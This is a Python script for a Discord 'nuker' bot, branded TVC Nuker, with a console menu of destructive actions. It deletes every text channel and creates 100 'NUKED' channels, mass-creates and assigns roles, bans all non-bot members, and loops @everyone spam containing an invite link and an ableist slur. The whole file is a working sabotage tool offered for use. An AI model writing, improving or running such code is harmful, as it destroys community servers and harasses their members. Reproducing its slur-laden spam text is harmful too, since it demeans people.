import discord
import random
from discord import Client, Permissions
from colorama import Back, Fore, Style
from pystyle import Colorate, Colors
import asyncio


ascii_art = """

▄▄▄█████▓ ██▒   █▓ ▄████▄      ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▓  ██▒ ▓▒▓██░   █▒▒██▀ ▀█      ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒ ▓██░ ▒░ ▓██  █▒░▒▓█    ▄    ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
░ ▓██▓ ░   ▒██ █░░▒▓▓▄ ▄██▒   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
  ▒██▒ ░    ▒▀█░  ▒ ▓███▀ ░   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
  ▒ ░░      ░ ▐░  ░ ░▒ ▒  ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
    ░       ░ ░░    ░  ▒      ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
  ░           ░░  ░              ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
               ░  ░ ░                  ░    ░     ░  ░      ░  ░   ░     
              ░   ░                                                      
    """
print(Colorate.Horizontal(Colors.blue_to_purple, ascii_art))
print(Colorate.Horizontal(Colors.yellow_to_green, """================================ MOTD ==========================================
                          """))
print("                     fuck skids | TVC x UTL ontop!")
print(Colorate.Horizontal(Colors.green_to_blue, """
================================ MOTD =========================================="""))

version = """
 ╔════════════════╦════════════════════╗
 ║ Version 2.5    ║ Core Version 2.5   ║
 ╚════════════════╩════════════════════╝
"""
print(Colorate.Vertical(Colors.blue_to_purple, version))

menu = (f"""
 ╔══════════════════╦═══════════════════╗
 ║ 1: delete all    ║  3: banall        ║
 ║══════════════════╬═══════════════════║
 ║ 2: rolespam      ║ 4: ping spam      ║
 ╚══════════════════╩═══════════════════╝
""")
print(Colorate.Vertical(Colors.purple_to_blue, menu))
 

intents = discord.Intents.default()
intents.all()

client = discord.Client(intents=intents)

TOKEN = 'put the bot token here'

async def deleteall(guild):
    try:
        channels = guild.text_channels
        await asyncio.gather(*[channel.delete() for channel in channels])
        await asyncio.gather(*[guild.create_text_channel(f"NUKED BY TVC") for _ in range(100)])
    except discord.Forbidden as e:
        print(f"Failed to delete/create channels: {e}")


async def rolespam(guild):
    try:
        await asyncio.gather(*[guild.create_role(name='NUKED') for _ in range(100)])
        role = discord.utils.get(guild.roles, name='NUKED')
        await asyncio.gather(*[member.add_roles(role) for member in guild.members if not member.bot])
    except discord.Forbidden as e:
        print(f"Failed to create role or assign roles: {e}")
    except AttributeError:
        print("Role not found.")
    except Exception as e:
        print(f"Failed to add role to members: {e}")


async def banall(guild):
    try:
        await asyncio.gather(*[member.ban(reason="NUKED") for member in guild.members if not member.bot])
    except discord.Forbidden as e:
        print(f"Failed to ban members: {e}")
    except Exception as e:
        print(f"Failed to ban members: {e}")


async def spammessage(guild):
    try:
        channels = guild.text_channels
        while True:
            tasks = [channel.send(
                '@everyone Join TVC or ur retarded https://discord.gg/Ha5NQHSgcy https://www.youtube.com/watch?v=Isz3938g5pQ| @everyone Join TVC or ur retarded https://discord.gg/Ha5NQHSgcy https://www.youtube.com/watch?v=Isz3938g5pQ  https://cdn.discordapp.com/attachments/1191984469385674763/1193009590774812802/funni_cat_3.mov?ex=65ab27c3&is=6598b2c3&hm=ab92f8372f01a9a41d2455902936597761da48d3f7ccc65f8cb300ff17bb829d&')
                     for _ in range(5) for channel in channels]
            await asyncio.gather(*tasks)
    except discord.Forbidden as e:
        print(f"Failed to send messages: {e}")
    except Exception as e:
        print(f"Failed to send messages: {e}")


@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name='just chilling'))
    await handle_console_input()


async def handle_console_input():
    while True:
        command = await client.loop.run_in_executor(None, input, 'Choice : ')
        args = command.split(' ')
        guild = client.guilds[0]  # Assuming you want to perform actions on the first guild the bot is in
        if args[0] == '1':
            await deleteall(guild)
        elif args[0] == '2':
            await rolespam(guild)
        elif args[0] == '3':
            await banall(guild)
        elif args[0] == '4':
            await spammessage(guild)
        elif command == 'exit':
            break
        else:
            print('Invalid command. Try "1", "2", "3", "4", or "exit.')
            

client.run(TOKEN)

